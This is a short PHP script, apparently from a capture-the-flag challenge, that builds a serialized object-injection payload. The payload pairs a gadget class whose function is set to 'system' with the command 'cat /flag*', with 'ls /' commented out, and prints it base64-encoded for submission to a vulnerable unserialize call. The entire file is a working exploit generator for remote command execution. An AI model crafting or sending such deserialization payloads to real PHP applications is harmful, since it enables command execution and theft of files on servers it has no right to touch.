<?php
class Caster
{
    public $cast_func = 'system';
}

class Cat
{
    public $magic;
    public $spell;
    function __construct()
    {
        $this->magic = new Caster();
        // $this->spell = 'ls /';
        $this->spell = 'cat /flag*';
    }
}
echo base64_encode(serialize(new Cat()));